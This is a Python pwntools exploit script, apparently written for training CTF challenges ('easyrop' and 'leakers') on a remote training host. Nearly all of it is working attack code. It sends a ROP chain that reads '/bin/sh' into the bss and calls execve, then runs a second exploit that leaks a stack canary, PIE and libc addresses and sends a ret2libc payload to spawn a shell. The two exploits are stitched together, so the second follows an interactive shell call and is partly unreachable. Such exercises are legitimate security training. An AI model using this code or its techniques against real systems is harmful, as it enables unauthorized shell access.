from pwn import *
import time

import sys
sys.path.append('../../')
import pwnutil as util

#context.terminal = ['tmux', 'splitw', '-h']
# Connect to remote machine
r = remote("training.jinblack.it", 2015)

#r = process("./easyrop") 

''' not attaching to remote
b *0x400235 b *0x400291

gdb.attach(r, """ 
	
	c
		
        """)
  '''


'''
elf = ELF("./leakers")
rop = ROP(elf)
gadget_offset = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as: ROPgadget --binary leakers | grep "pop rdi"

print("Gadget offset:")
print(gadget_offset)
input("atatat")
'''

'''
EXPLANATION
- here instead of loading shellcode into the bss and executing, we do a ret2libc.
	- since we are working with x64, we need to pass to system() a pointer to /bin/sh through the rdi register.
		-  we use a rop gadget for this.
x/5i 0x4001c2
   0x4001c2 <main+10>:	pop    rdi
   0x4001c3 <main+11>:	pop    rsi
   0x4001c4 <main+12>:	pop    rdx
   0x4001c5 <main+13>:	pop    rax
   0x4001c6 <main+14>:	ret   

'''

input("wait")

print(r.clean())

'''
Refering to the bytes needed in order for the program to write 64 bits to the stack as chunks
'''

bss_address = 0x600370 # we will write \bin\sh here

read_address = 0x400144
execve_rax = 0x3b
pop_gadget = 0x4001c2
syscall_gadget = 0x400168
write_address = 0x400172

padding = (b'\x00' * 4 + b'\x00' * 4) * 14

#eip = p32(0x400172) + b'\x00' * 4 + b'\x00' * 4 + b'\x00' * 4

read_address_chunk = p32(read_address) + b'\x00' * 12

binsh_address_chunk = p32(bss_address) + b'\x00' * 12
execve_rax_chunk = p32(execve_rax) + b'\x00' * 12
pop_gadget_chunk = p32(pop_gadget) + b'\x00' * 12
syscall_gadget_chunk = p32(syscall_gadget) + b'\x00' * 12
empty_args_chunk = b'\x00' * 16 * 2

read_arg1_chunk = p32(0x0) + b'\x00' * 12
read_arg2_chunk = p32(bss_address) + b'\x00' * 12
read_arg3_chunk = p32(8) + b'\x00' * 12
read_rax_chunk = p32(0x0) + b'\x00' * 12
read_args = read_arg1_chunk + read_arg2_chunk + read_arg3_chunk + read_rax_chunk

#write_address_chunk = p32(write_address) + b'\x00' * 12

#TODO read from terminal binsh into stack then pass that address to 

r.send(padding + pop_gadget_chunk + read_args + read_address_chunk + pop_gadget_chunk + binsh_address_chunk + empty_args_chunk + execve_rax_chunk + syscall_gadget_chunk) 


input("wait")

r.clean()

r.send(b'\0')
time.sleep(0.01)
r.send(b'\0')
time.sleep(0.01)
r.clean()

input("wait")

r.send(b'/bin/sh\0')

r.interactive()

offset_to_canary = 8*13 #offset to the canary, which is the first data we leak

def pre_leak_consumer(max_returned_bytes, filler_size):
	r.recvuntil(b'> ')
	r.recv(filler_size)
	leak = r.recv(max_returned_bytes - filler_size, timeout=0.01)
	return leak

acc = util.leak_bytes(r, 200, offset_to_canary, pre_leak_consumer)

print("\nLeaked: ")
util.print_packed(acc, 8)
print("\n")

#Previously calculated offsets
pie_base_offset = -0xac0
gadget_offset = 0xb23 #offset to a pop rdi; ret; gadget from pie base (ROPgadget --binary leakers | grep "pop rdi")
system_offset_from_leaked_libc = 0x2d949
binsh_offset_from_leaked_libc = 0x192563

#In acc we have the leaked stuff
# <canary> <pie_address> <libc_main_address>
# both the pie and libc addresses are an offset of their bases

#get canary
canary = b'\0' + acc[1:8]

#get leaked pie_address and offset it to the base
pie_leak = u64(acc[8:16])
pie_base = pie_leak + pie_base_offset
#calculate pop rdi; ret; gadget address from the pie base
gadget_address = pie_base + gadget_offset

#get leaked libc address
leaked_libc_address = u64(acc[16:24])
#calculate system and binsh addresses with the corresponding offsets
system_address = leaked_libc_address + system_offset_from_leaked_libc
binsh_address  = leaked_libc_address + binsh_offset_from_leaked_libc


print("Canary: " + hex(u64(canary)))
print("pie base: " + hex(pie_base))
print("gadget: " + hex(gadget_address))
print("Leaked libc: " + hex(leaked_libc_address))
print("binsh: " + hex(binsh_address))
print("system: " + hex(system_address))
print("\n")

input("Leak done, proceed to exploit")

ret2libc = b'A' * offset_to_canary + canary + b'A' * 8 + p64(gadget_address) + p64(binsh_address) + p64(gadget_address + 1)  + p64(system_address) + b'C' * 8
r.send(ret2libc)
r.clean()

input("done")

r.interactive()
